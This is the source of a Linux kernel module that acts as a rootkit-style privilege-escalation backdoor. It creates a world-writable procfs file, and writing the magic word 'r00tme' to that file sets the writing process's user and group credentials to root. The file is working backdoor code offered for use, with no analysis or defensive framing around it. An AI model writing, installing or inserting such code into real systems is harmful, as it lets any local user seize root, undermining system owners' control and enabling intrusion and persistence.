// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/sched.h>
#include <linux/uaccess.h>
#include <linux/uidgid.h>

#define MAGIC_WORD "r00tme"

static struct proc_dir_entry *entry;
static atomic_t trigger_count = ATOMIC_INIT(0);

static ssize_t trigger_write(struct file *file, const char __user *buffer,
			    size_t count, loff_t *position)
{
	char buf[32];
	struct cred *creds;
	size_t len = min(count, sizeof(buf) - 1);

	if (copy_from_user(buf, buffer, len))
		return -EFAULT;
	buf[len] = '\0';

	if (len > 0 && buf[len - 1] == '\n')
		buf[len - 1] = '\0';

	if (strcmp(buf, MAGIC_WORD) != 0)
		return count;

	creds = prepare_creds();
	if (!creds)
		return -ENOMEM;

	creds->uid = GLOBAL_ROOT_UID;
	creds->gid = GLOBAL_ROOT_GID;
	creds->euid = GLOBAL_ROOT_UID;
	creds->egid = GLOBAL_ROOT_GID;
	creds->suid = GLOBAL_ROOT_UID;
	creds->sgid = GLOBAL_ROOT_GID;
	creds->fsuid = GLOBAL_ROOT_UID;
	creds->fsgid = GLOBAL_ROOT_GID;
	commit_creds(creds);

	atomic_inc(&trigger_count);
	pr_info("rk: trigger activated for pid %d\n", current->pid);
	return count;
}

static int trigger_read(struct seq_file *m, void *v)
{
	seq_printf(m, "triggers=%d\nuid=%u\n",
		   atomic_read(&trigger_count),
		       from_kuid(&init_user_ns, current_uid()));
	return 0;
}

static int trigger_open(struct inode *inode, struct file *file)
{
	return single_open(file, trigger_read, NULL);
}

static const struct proc_ops trigger_proc_ops = {
	.proc_open    = trigger_open,
	.proc_read    = seq_read,
	.proc_lseek   = seq_lseek,
	.proc_release = single_release,
	.proc_write   = trigger_write,
};

static int __init privesc_init(void)
{
	entry = proc_create("rk_privesc", 0666, NULL, &trigger_proc_ops);
	if (!entry)
		return -ENOMEM;

	pr_info("rk: proc trigger ready\n");
	return 0;
}

static void __exit privesc_exit(void)
{
	proc_remove(entry);
}

module_init(privesc_init);
module_exit(privesc_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Procfs privilege escalation trigger");
